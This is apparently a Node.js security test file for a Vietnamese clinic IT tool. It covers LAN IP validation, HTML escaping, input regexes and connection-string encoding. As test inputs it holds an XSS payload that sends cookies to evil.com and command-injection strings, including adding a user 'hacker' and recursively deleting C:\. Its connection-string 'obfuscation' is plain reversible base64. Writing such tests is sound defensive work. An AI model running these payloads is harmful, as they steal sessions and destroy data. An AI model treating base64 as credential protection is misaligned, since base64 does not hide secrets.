const test = require('node:test');
const assert = require('node:assert');

test('Security Sanitizer & LAN IP Guard (RFC 1918)', () => {
  function isValidLanIp(ip) {
    if (!ip || typeof ip !== 'string') return false;
    const parts = ip.trim().split('.');
    if (parts.length !== 4) return false;
    const nums = [];
    for (const part of parts) {
      if (!/^\d{1,3}$/.test(part)) return false;
      const num = parseInt(part, 10);
      if (isNaN(num) || num < 0 || num > 255) return false;
      nums.push(num);
    }
    const [a, b] = nums;
    if (a === 127 || a === 10) return true;
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 169 && b === 254) return true;
    return false;
  }

  // 1. Chấp nhận các dải IP Private LAN hợp lệ
  assert.strictEqual(isValidLanIp('192.168.1.100'), true);
  assert.strictEqual(isValidLanIp('10.10.20.5'), true);
  assert.strictEqual(isValidLanIp('172.16.5.1'), true);
  assert.strictEqual(isValidLanIp('172.31.200.1'), true);
  assert.strictEqual(isValidLanIp('127.0.0.1'), true);
  assert.strictEqual(isValidLanIp('169.254.10.20'), true);

  // 2. Chặn đứng các dải IP công cộng ngoài WAN và các chuỗi giả mạo (Chống SSRF)
  assert.strictEqual(isValidLanIp('8.8.8.8'), false, 'Không được phép kết nối ra WAN DNS');
  assert.strictEqual(isValidLanIp('172.32.0.1'), false, '172.32 nằm ngoài RFC 1918');
  assert.strictEqual(isValidLanIp('1.1.1.1'), false, 'Không được phép kết nối ra Internet IP');
  assert.strictEqual(isValidLanIp('192.168.1.1; whoami'), false, 'Chặn command injection trong IP');
  assert.strictEqual(isValidLanIp(''), false);
  assert.strictEqual(isValidLanIp(null), false);
});

test('Stored XSS Protection for Queue Display', () => {
  function esc(str) {
    if (!str) return '';
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  const maliciousPayload = '<script>fetch("http://evil.com?c="+document.cookie)</script>';
  const safeOutput = esc(maliciousPayload);
  assert.strictEqual(safeOutput.includes('<script>'), false);
  assert.strictEqual(safeOutput, '&lt;script&gt;fetch(&quot;http://evil.com?c=&quot;+document.cookie)&lt;/script&gt;');

  const imgOnError = '<img src=x onerror=alert(1)>';
  assert.strictEqual(esc(imgOnError).includes('<img'), false);
});

test('Parameter Validation for Net & Printer tools', () => {
  const userRegex = /^[a-zA-Z0-9_.-]{1,32}$/;
  const printerRegex = /^[a-zA-Z0-9_ .()-]{1,128}$/;

  // Hợp lệ
  assert.strictEqual(userRegex.test('Administrator'), true);
  assert.strictEqual(userRegex.test('kt_vien-01'), true);
  assert.strictEqual(printerRegex.test('Canon LBP 2900 (LAN)'), true);
  assert.strictEqual(printerRegex.test('HP LaserJet Pro M402dne'), true);

  // Bất hợp lệ (có chứa ký tự injection)
  assert.strictEqual(userRegex.test('admin & net user hacker 123 /add'), false);
  assert.strictEqual(userRegex.test('admin$(calc.exe)'), false);
  assert.strictEqual(printerRegex.test('Canon"; Remove-Item C:\\ -Recurse; #'), false);
});

test('Connection String Obfuscation Guard', () => {
  function obfuscate(connStr) {
    return 'ENC:' + Buffer.from(encodeURIComponent(connStr), 'utf8').toString('base64');
  }
  function deobfuscate(encStr) {
    if (!encStr.startsWith('ENC:')) return encStr;
    const rawB64 = encStr.slice(4);
    return decodeURIComponent(Buffer.from(rawB64, 'base64').toString('utf8'));
  }

  const rawConn = 'Server=192.168.1.50;Database=HIS_PRO;User Id=sa;Password=SecretPassword123!@#;TrustServerCertificate=true;';
  const enc = obfuscate(rawConn);

  // Không lưu plaintext password thô sơ
  assert.strictEqual(enc.includes('SecretPassword123!@#'), false);
  assert.strictEqual(enc.startsWith('ENC:'), true);

  // Giải mã phục hồi nguyên vẹn 100%
  const recovered = deobfuscate(enc);
  assert.strictEqual(recovered, rawConn);
});

test('Preserve Vietnamese diacritics in Endoscopy Folder Creation', () => {
  function sanitizeFolderName(patientCode, fullName, timestamp) {
    const sanitizedName = (fullName || 'BenhNhan')
      .trim()
      .replace(/[\\/:*?"<>|\x00-\x1F]/g, '_')
      .replace(/\s+/g, ' ');
    return `${patientCode}_${sanitizedName}_${timestamp}`;
  }

  const code = 'BN00123';
  const name = 'Nguyễn Thị Bích Phượng';
  const ts = 1773729600000;
  const folder = sanitizeFolderName(code, name, ts);

  // Bảo toàn tiếng Việt có dấu
  assert.strictEqual(folder, 'BN00123_Nguyễn Thị Bích Phượng_1773729600000');
  // Không chứa ký tự cấm của hệ điều hành Windows NTFS
  assert.strictEqual(/[\\/:*?"<>|]/.test(folder), false);
});
